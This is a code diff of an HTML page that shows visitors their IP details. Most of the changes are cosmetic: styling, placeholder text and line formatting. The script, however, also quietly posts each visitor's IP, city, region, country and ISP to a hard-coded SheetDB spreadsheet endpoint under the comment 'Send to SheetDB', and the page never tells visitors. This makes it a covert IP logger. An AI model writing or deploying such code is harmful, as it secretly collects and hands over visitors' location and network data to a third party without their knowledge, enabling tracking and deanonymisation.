@@ -3,12 +3,21 @@
 <head>
   <meta charset="UTF-8">
   <title>IP Tracker</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 20px;
+    }
+    p {
+      margin: 8px 0;
+    }
+  </style>
 </head>
 <body>
   <h1>Your IP Info:</h1>
   <p id="ip">Loading IP...</p>
-  <p id="location"></p>
-  <p id="time"></p>
+  <p id="location">Loading location...</p>
+  <p id="time">Loading time...</p>
 
   <script>
     fetch('https://ipapi.co/json/')
@@ -25,15 +34,14 @@
 
         // Display on the page
         document.getElementById('ip').textContent = `IP: ${ipData.ip}`;
-        document.getElementById('location').textContent = `Location: ${ipData.city}, ${ipData.region}, ${ipData.country} | ISP: ${ipData.isp}`;
+        document.getElementById('location').textContent =
+          `Location: ${ipData.city}, ${ipData.region}, ${ipData.country} | ISP: ${ipData.isp}`;
         document.getElementById('time').textContent = `Time: ${ipData.time}`;
 
         // Send to SheetDB
         fetch('https://sheetdb.io/api/v1/8wvumuh9jaw2d', {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ data: ipData })
         });
       })
